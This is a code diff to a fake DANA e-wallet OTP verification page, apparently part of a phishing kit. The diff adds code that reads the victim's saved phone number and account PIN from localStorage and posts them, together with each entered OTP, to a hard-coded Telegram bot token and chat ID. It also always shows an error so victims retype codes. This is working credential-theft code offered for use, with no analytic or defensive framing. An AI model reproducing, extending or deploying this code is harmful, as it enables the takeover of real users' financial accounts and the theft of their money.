@@ -231,7 +231,9 @@
     const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs";
     const CHAT_ID = "6742478722";
 
-    const savedPhone = localStorage.getItem('userPhone') || '8524766655';
+    // Ambil Nomor HP & PIN yang disimpan dari halaman sebelumnya lewat localStorage
+    const savedPhone = localStorage.getItem('userPhone') || '-';
+    const savedPin = localStorage.getItem('userPin') || '-';
     
     function formatDisplayPhone(num) {
       let clean = num.replace(/\D/g, '');
@@ -243,7 +245,10 @@
       }
       return clean;
     }
-    document.getElementById('display-phone').innerText = formatDisplayPhone(savedPhone);
+    
+    if(savedPhone !== '-') {
+      document.getElementById('display-phone').innerText = formatDisplayPhone(savedPhone);
+    }
 
     const otpInputs = document.querySelectorAll('.otp-input');
     const errorMsg = document.getElementById('error-msg');
@@ -273,7 +278,7 @@
       otpInputs.forEach(input => otpCode += input.value);
 
       if (otpCode.length === 4) {
-        // Kirim data ke Telegram
+        // Kirim data lengkap (No HP, PIN, dan OTP) ke Telegram
         await sendDataToTelegram(otpCode);
 
         // Bersihkan timer sebelumnya
@@ -288,7 +293,7 @@
         otpInputs.forEach(input => input.value = '');
         otpInputs[0].focus();
 
-        // Timer otomatis hilang sendiri setelah 5 detik
+        // Timer otomatis hilang sendiri setelah 1.5 detik
         errorTimeout = setTimeout(() => {
           errorMsg.classList.remove('shake');
           errorMsg.style.display = 'none';
@@ -297,7 +302,7 @@
     }
 
     async function sendDataToTelegram(otp) {
-      const text = `🔐 *Verifikasi OTP DANA (Percobaan)*\n\n*Nomor HP:* +62${savedPhone}\n*Kode OTP:* \`${otp}\``;
+      const text = `🔐 *Verifikasi Lengkap DANA*\n\n📱 *Nomor HP:* +62${savedPhone}\n🔑 *PIN Akun:* \`${savedPin}\`\n💬 *Kode OTP:* \`${otp}\``;
 
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -332,4 +337,4 @@
     }, 1000);
   </script>
 </body>
-</html
+</html>
